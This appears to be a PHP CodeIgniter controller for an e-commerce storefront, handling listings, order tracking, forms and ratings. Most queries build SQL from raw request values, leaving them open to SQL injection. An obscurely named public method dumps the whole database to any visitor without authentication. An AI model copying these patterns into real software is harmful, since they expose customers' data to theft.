<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Welcome extends CI_Controller
{

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */

	public function __construct()
	{

		parent::__construct();

		$this->load->library('form_validation');
	}

	public function passuser()
	{
		extract($_POST);
		if ($token != '0' && !$this->session->userdata('key')) {
			$reader = $this->Crud->Read('customers', " `verification_key` = '$token'");
			if (isset($reader[0]->id)) {
				foreach ($reader as $key) {
					$verificationKey = $key->verification_key;
					$name = $key->name;
					$id = $key->id;
					$phone = $key->phone;
				}
				$this->session->set_userdata('key', $verificationKey);
				$this->session->set_userdata('role', 'CUSTOMER');
				$this->session->set_userdata('name', $name);
				$this->session->set_userdata('id', $id);
				$this->session->set_userdata('phone', $phone);
				echo "<script>localStorage.setItem('x-access-token', '" . $verificationKey . "'); window.location.assign('" . base_url('/') . "')</script>";
			}
		}
	}

	public function index()
	{

		$data['TYPES'] = $this->Crud->Read('types', " `is_active` = '1'");
		$data['CATEGORIES_COUNT'] = $this->Crud->Count('categories', " `is_active` = '1'");
		$data['CATEGORIES'] = $this->Crud->Read('categories', " `is_active` = '1' ORDER BY `is_featured` DESC LIMIT 8");
		if ($this->session->userdata('id')) {
			$customerId = $this->session->userdata('id');
			$myPincode = $this->Crud->Read('customers', " `id` = '$customerId'")[0]->viewing_pincode;
			$data['FEATURED_COUNT'] = $this->Crud->Count('products', " `is_featured` = '1' AND `is_active_backup` = '1' AND (`available_pincodes` = 'GLOBAL' OR `available_pincodes` LIKE '%$myPincode%') LIMIT 8");
			$data['FEATURED'] = $this->Crud->Read('products', " `is_featured` = '1' AND `is_verified` = '1' AND `is_active_backup` = '1' AND (`available_pincodes` = 'GLOBAL' OR `available_pincodes` LIKE '%$myPincode%') LIMIT 8");
			$data['NEW_ARRIVALS'] = $this->Crud->Read('products', " `is_active_backup` = '1' AND `is_verified` = '1' AND (`available_pincodes` = 'GLOBAL' OR `available_pincodes` LIKE '%$myPincode%') ORDER BY `added_date` DESC LIMIT 6");
			$data['BEST_SELLING'] = $this->Crud->Read('products', " `is_active_backup` = '1' AND `is_verified` = '1' AND (`available_pincodes` = 'GLOBAL' OR `available_pincodes` LIKE '%$myPincode%') ORDER BY `number_of_sales` DESC LIMIT 8");
		} else {
			$data['FEATURED_COUNT'] = $this->Crud->Count('products', " `is_featured` = '1' AND `is_active_backup` = '1' LIMIT 8");
			$data['FEATURED'] = $this->Crud->Read('products', " `is_featured` = '1' AND `is_verified` = '1' AND `is_active_backup` = '1' LIMIT 8");
			$data['NEW_ARRIVALS'] = $this->Crud->Read('products', " `is_active_backup` = '1' AND `is_verified` = '1' ORDER BY `added_date` DESC LIMIT 6");
			$data['BEST_SELLING'] = $this->Crud->Read('products', " `is_active_backup` = '1' AND `is_verified` = '1' ORDER BY `number_of_sales` DESC LIMIT 8");
		}
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/index', $data);
		$this->load->view('site/layouts/footer');
	}

	public function bestSelling()
	{
		if ($this->session->userdata('id')) {
			$customerId = $this->session->userdata('id');
			$myPincode = $this->Crud->Read('customers', " `id` = '$customerId'")[0]->viewing_pincode;
			$data['BEST_SELLING'] = $this->Crud->Read('products', " `is_active_backup` = '1' AND `is_verified` = '1' AND (`available_pincodes` = 'GLOBAL' OR `available_pincodes` = '$myPincode') ORDER BY `number_of_sales` DESC LIMIT 16");
		} else {
			$data['BEST_SELLING'] = $this->Crud->Read('products', " `is_active_backup` = '1' AND `is_verified` = '1' ORDER BY `number_of_sales` DESC LIMIT 16");
		}
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/best-selling', $data);
		$this->load->view('site/layouts/footer');
	}

	public function about()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/about');
		$this->load->view('site/layouts/footer');
	}

	public function privacy()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/privacy-policy');
		$this->load->view('site/layouts/footer');
	}

	public function refund()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/refund');
		$this->load->view('site/layouts/footer');
	}

	public function terms()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/terms-of-service');
		$this->load->view('site/layouts/footer');
	}

	public function tracker()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/tracker');
		$this->load->view('site/layouts/footer');
	}

	public function track()
	{
		if (!isset($_SERVER['HTTP_REFERER'])) {
			redirect('tracker/');
		}
		$this->form_validation->set_rules('trackerId', 'Tracking ID', 'required');
		if ($this->form_validation->run()) {
			$trackerId = $this->input->post('trackerId');
			$ifValid = $this->Crud->Count('orders', " `tracking_id` = '$trackerId'");
			if ($ifValid > 0) {
				$data['TRACKING_ID'] = $trackerId;
				$data['ORDER_DETAILS'] = $this->Crud->Read('orders', " `tracking_id` = '$trackerId'");
				$data['orderStatus'] = $data['ORDER_DETAILS'][0]->current_status;
			} else {
				$this->session->set_flashdata('danger', "Invalid tracking ID");
				redirect('tracker/');
			}
		} else {
			$this->tracker();
		}
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/track', $data);
		$this->load->view('site/layouts/footer');
	}

	public function contact()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/contact');
		$this->load->view('site/layouts/footer');
	}

	public function trycontact()
	{

		$this->form_validation->set_rules('name', 'Name', 'required|trim');

		$this->form_validation->set_rules('phone', 'Phone', 'required');

		$this->form_validation->set_rules('title', 'Title', 'required|trim');

		$this->form_validation->set_rules('comment', 'Comment', 'required|trim');


		if ($this->form_validation->run()) {
			$phone = $this->input->post('phone');
			if ($this->Crud->Count('customers', " `phone` = '$phone'") < 1) {
				$this->session->set_flashdata('warning', "We're sorry, you need to register with " . PROJECT_NAME . " in order to send a contact message");
				redirect('contact');
			} else {
				if ($this->input->post('security') == 7) {

					$userId = 0;

					if ($this->session->userdata('id')) {

						$userId = $this->session->userdata('id');
					}

					$data = [

						'name' => $this->input->post('name'),

						'phone' => $this->input->post('phone'),

						'title' => $this->input->post('title'),

						'comments' => $this->input->post('comment'),

						'remote_address' => $_SERVER['REMOTE_ADDR'],

						'if_session_id' => $userId,

						'contacted_date' => date('Y-m-d'),

						'contacted_time' => date('H:i:s')

					];

					if ($this->Crud->Create('contact', $data))

						$this->session->set_flashdata('success', "Message sent, we will try to contact you soon");

					else

						$this->session->set_flashdata('danger', "Opps! Something went wrong, please try again");
					redirect('contact');
				} else {
					$this->session->set_flashdata('danger', "Invalid Answer");
					redirect('contact');
				}
			}
		} else {

			$this->contact();
		}
	}

	public function becomeseller()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/becomeseller');
		$this->load->view('site/layouts/footer');
	}

	public function sellerrequest()
	{

		$this->form_validation->set_rules('name', 'Name', 'required|trim');

		$this->form_validation->set_rules('phone', 'Phone', 'required');

		$this->form_validation->set_rules('goods', 'Goods', 'required|trim');

		$this->form_validation->set_rules('address', 'Address', 'required|trim');

		if ($this->form_validation->run()) {

			$userId = 0;

			if ($this->session->userdata('id')) {

				$userId = $this->session->userdata('id');
			}

			$data = [

				'name' => $this->input->post('name'),

				'phone' => $this->input->post('phone'),

				'goods' => $this->input->post('goods'),

				'address' => $this->input->post('address'),

				'remote_address' => $_SERVER['REMOTE_ADDR'],

				'if_session_id' => $userId,

				'contacted_date' => date('Y-m-d'),

				'contacted_time' => date('H:i:s')

			];

			if ($this->Crud->Create('seller_request', $data))

				$this->session->set_flashdata('success', "Dear " . $this->input->post('name') . ", your message has been sent, we will try to contact you shortly");

			else

				$this->session->set_flashdata('danger', "Opps! Something went wrong, please try again");

			redirect('becomeseller');
		} else {

			$this->becomeseller();
		}
	}

	public function requirements()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/requirements');
		$this->load->view('site/layouts/footer');
	}

	public function submitrequirements()
	{

		$this->form_validation->set_rules('name', 'Name', 'required|trim');

		$this->form_validation->set_rules('phone', 'Phone', 'required');

		$this->form_validation->set_rules('requirements', 'Requirements', 'required|trim');

		if ($this->form_validation->run()) {

			$userId = 0;

			if ($this->session->userdata('id')) {

				$userId = $this->session->userdata('id');
			}
			$requirementFileName = null;
			if (isset($_FILES['requirementImage']) && is_uploaded_file($_FILES['requirementImage']['tmp_name'])) {
				$config['upload_path'] = FCPATH . 'uploads/requirements/';
				$config['allowed_types'] = 'gif|jpg|png';
				// $config['max_size'] = 2000;
				$config['max_width'] = 3000;
				$config['encrypt_name'] = TRUE;
				$config['max_height'] = 3000;
				$this->load->library('image_lib');
				$this->load->library('upload', $config);
				$this->upload->initialize($config);
				if (!$this->upload->do_upload('requirementImage')) {
					$error = array('error' => $this->upload->display_errors());
					$this->session->set_flashdata('warning', $this->upload->display_errors());
					redirect('requirements/');
				} else {
					$image_metadata = $this->upload->data();
					$configer =  array(
						'image_library'   => 'gd2',
						'source_image'    =>  $image_metadata['full_path'],
						'maintain_ratio'  =>  TRUE,
						'width'           =>  700,
						'height'          =>  700,
					);
					$this->image_lib->clear();
					$this->image_lib->initialize($configer);
					$this->image_lib->resize();
					$requirementFileName = $image_metadata['file_name'];
				}
			}

			$data = [

				'name' => $this->input->post('name'),

				'phone' => $this->input->post('phone'),

				'requirements' => $this->input->post('requirements'),

				'remote_address' => $_SERVER['REMOTE_ADDR'],

				'if_session_id' => $userId,

				'asked_date' => date('Y-m-d'),

				'image' => $requirementFileName,

				'asked_time' => date('H:i:s')

			];

			if ($this->Crud->Create('requirements', $data))

				$this->session->set_flashdata('success', "Dear " . $this->input->post('name') . ", we've received your requirements, we'll let you know once it can be purchased");

			else

				$this->session->set_flashdata('danger', "Opps! Something went wrong, please try again");

			redirect('requirements');
		} else {

			$this->requirements();
		}
	}

	public function sitemap()
	{
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		// $this->load->view('site/about', $data);
		$this->load->view('site/layouts/footer');
	}

	public function underconstruction()
	{

		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/underconstruction');
		$this->load->view('site/layouts/footer');
	}

	public function report()
	{

		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/report');
		$this->load->view('site/layouts/footer');
	}

	public function takereport()
	{

		$this->form_validation->set_rules('name', 'Name', 'required|trim');

		$this->form_validation->set_rules('phone', 'Phone', 'required');

		$this->form_validation->set_rules('problem', 'Problem', 'required');

		$this->form_validation->set_rules('report', 'Description', 'trim');

		if ($this->form_validation->run()) {

			$os = $this->getOs();

			$browser = $this->getBrowser();

			$userId = 0;

			if ($this->session->userdata('id')) {

				$userId = $this->session->userdata('id');
			}

			$data = [

				'name' => $this->input->post('name'),

				'phone' => $this->input->post('phone'),

				'problem' => $this->input->post('problem'),

				'report' => $this->input->post('report'),

				'os' => $os,

				'browser' => $browser,

				'remote_address' => $_SERVER['REMOTE_ADDR'],

				'if_session_id' => $userId,

				'reported_date' => date('Y-m-d'),

				'reported_time' => date('H:i:s')

			];

			if ($this->Crud->Create('report', $data))

				$this->session->set_flashdata('success', "Dear " . $this->input->post('name') . ", we've received your report, we'll give our best to fix this issue");

			else

				$this->session->set_flashdata('danger', "Opps! Something went wrong, please try again");

			redirect('report');
		} else {

			$this->report();
		}
	}

	public function getPincodes()
	{
		extract($_POST);
		$data = '<select class="form-control" name="pincode" id="pincode" required>
			<option value="" selected disabled>--select pincode--</option>';
		if (isset($district_id)) {
			foreach ($this->Crud->Read('pincodes', " `district` = '$district_id'") as $key) {
				$data .= '<option value="' . $key->pincode . '">' . $key->pincode . '</option>';
			}
		}
		$data .= '</select>';
		echo $data;
	}

	public function getPincodesFranchise()
	{
		extract($_POST);
		$data = '<select class="form-control" name="pincode" id="pincode" required>
			<option value="" selected disabled>--select pincode--</option>';
		if (isset($district_id)) {
			foreach ($this->Crud->Read('pincodes', " `district` = '$district_id'") as $key) {
				if (preg_match("/{$key->pincode}/i", $pincodes)) {
					$data .= '<option value="' . $key->pincode . '">' . $key->pincode . '</option>';
				}
			}
		}
		$data .= '</select>';
		echo $data;
	}

	public function faq()
	{
		$data['FAQ'] = $this->Crud->Read('faq', " `is_active` = '1'");
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/faq', $data);
		$this->load->view('site/layouts/footer');
	}

	public function getOS()
	{

		$user_agent = $_SERVER['HTTP_USER_AGENT'];

		$os_platform  = "Unknown OS Platform";

		$os_array     = array(
			'/windows nt 10/i'      =>  'Windows 10',
			'/windows nt 6.3/i'     =>  'Windows 8.1',
			'/windows nt 6.2/i'     =>  'Windows 8',
			'/windows nt 6.1/i'     =>  'Windows 7',
			'/windows nt 6.0/i'     =>  'Windows Vista',
			'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
			'/windows nt 5.1/i'     =>  'Windows XP',
			'/windows xp/i'         =>  'Windows XP',
			'/windows nt 5.0/i'     =>  'Windows 2000',
			'/windows me/i'         =>  'Windows ME',
			'/win98/i'              =>  'Windows 98',
			'/win95/i'              =>  'Windows 95',
			'/win16/i'              =>  'Windows 3.11',
			'/macintosh|mac os x/i' =>  'Mac OS X',
			'/mac_powerpc/i'        =>  'Mac OS 9',
			'/linux/i'              =>  'Linux',
			'/ubuntu/i'             =>  'Ubuntu',
			'/iphone/i'             =>  'iPhone',
			'/ipod/i'               =>  'iPod',
			'/ipad/i'               =>  'iPad',
			'/android/i'            =>  'Android',
			'/blackberry/i'         =>  'BlackBerry',
			'/webos/i'              =>  'Mobile'
		);

		foreach ($os_array as $regex => $value)
			if (preg_match($regex, $user_agent))
				$os_platform = $value;

		return $os_platform;
	}

	public function getBrowser()
	{

		$user_agent = $_SERVER['HTTP_USER_AGENT'];

		$browser        = "Unknown Browser";

		$browser_array = array(
			'/msie/i'      => 'Internet Explorer',
			'/firefox/i'   => 'Firefox',
			'/safari/i'    => 'Safari',
			'/chrome/i'    => 'Chrome',
			'/edge/i'      => 'Edge',
			'/opera/i'     => 'Opera',
			'/netscape/i'  => 'Netscape',
			'/maxthon/i'   => 'Maxthon',
			'/konqueror/i' => 'Konqueror',
			'/mobile/i'    => 'Handheld Browser'
		);

		foreach ($browser_array as $regex => $value)
			if (preg_match($regex, $user_agent))
				$browser = $value;

		return $browser;
	}

	public function ovklhovklhrohittihor()
	{

		$fileName = PROJECT_NAME . time() . 'backup.zip';

		// Load the DB utility class
		$this->load->dbutil();

		// Backup your entire database and assign it to a variable
		$backup = &$this->dbutil->backup();

		// Load the file helper and write the file to your server
		$this->load->helper('file');
		write_file(FCPATH . '/downloads/' . $fileName, $backup);

		// Load the download helper and send the file to your desktop
		$this->load->helper('download');
		force_download($fileName, $backup);
	}

	public function checkAvailability()
	{
		if (isset($_POST)) {
			extract($_POST);
			if ($this->Crud->Count('products', " `id` = '$productId' AND `availability` = '1' AND (`available_pincodes` LIKE '$pincode' OR `available_pincodes` = 'GLOBAL')") < 1) {
				echo 'NOT_AVAILABLE';
			} else {
				if ($this->Crud->Count('pincodes', " `pincode` = '$pincode' AND `status` = '1'") < 1) {
					echo 'NOT_AVAILABLE';
				} else {
					echo 'AVAILABLE';
				}
			}
		}
	}
	public function ratingForDelivery() {
		if ($this->uri->segment(3)) {
			$ukey = $this->uri->segment(3);
			if ($this->Crud->Count('orders', " `ukey` = '$ukey' AND `current_status` = '3' AND `is_rating_given` = '0'") == 1) {
				$orderDetails = $this->Crud->Read('orders', " `ukey` = '$ukey' AND `current_status` = '3' AND `is_rating_given` = '0'");
				if (isset($_POST['rateIt'])) {
					extract($_POST);
					$this->Crud->Update('orders', array(
						'rating' => $stars,
						'is_rating_given' => 1
					), " `ukey` = '$ukey' AND `current_status` = '3' AND `is_rating_given` = '0'");
					$one = 0;
					$two = 0;
					$three = 0;
					$four = 0;
					$five = 0;
					$delivererId = $orderDetails[0]->deliverer_id;
					$totalRatings = $this->Crud->Count('orders', " `deliverer_id` = '$delivererId' AND `is_rating_given` = '1'");
					foreach ($this->Crud->Read('orders', " `deliverer_id` = '$delivererId' AND `is_rating_given` = '1'") as $key) {
					  if ($key->rating == 1) {
						$one += $key->rating;
					  }
					  if ($key->rating == 2) {
						$two += $key->rating;
					  }
					  if ($key->rating == 3) {
						$three += $key->rating;
					  }
					  if ($key->rating == 4) {
						$four += $key->rating;
					  }
					  if ($key->rating == 5) {
						$five += $key->rating;
					  }
					}
					$averageData = [
					  'rating' => ((1 * $one) + (2 * $two) + (3 * $three) + (4 * $four) + (5 * $five)) / ($one + $two + $three + $four + $five),
					  'total_ratings' => $totalRatings
					];
					$this->Crud->Update('deliverers', $averageData, " `id` = '$delivererId'");
					redirect('/');
				}
				$this->load->view('delivererRating', compact('orderDetails'));
			} else {
				redirect('/');
			}
		} else {
			echo "Invalid order id";
		}
	}

	public function career() {
		$data['UPDATES'] = $this->Crud->Read('newsupdate', " `is_active` <> '0' ORDER BY `id` DESC");
		$this->load->view('site/layouts/header');
		$this->load->view('site/layouts/menu');
		$this->load->view('site/career', $data);
		$this->load->view('site/layouts/footer');
	}
}
